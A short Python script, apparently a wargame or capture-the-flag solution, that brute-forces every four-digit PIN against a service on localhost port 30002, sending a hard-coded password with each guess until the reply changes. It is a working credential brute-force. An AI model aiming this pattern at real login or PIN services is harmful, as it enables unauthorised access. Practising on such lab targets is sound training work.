import socket
base = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
alli = ["%04d" % x for x in range(10000)]
s = socket.socket()
s.connect(("127.0.0.1",30002 ))
data = s.recv(2048)
print (data)

for n in alli:
    print ("Sending: " + str(n))
    s.send(base+ " " + str(n) + "\n")
    data = s.recv(2048)
    if not data.startswith("Wrong!"):
        print ("Yess!!: " + base + " " + str(n))
        break
    # else:
    #     print (data)
    

s.close()
    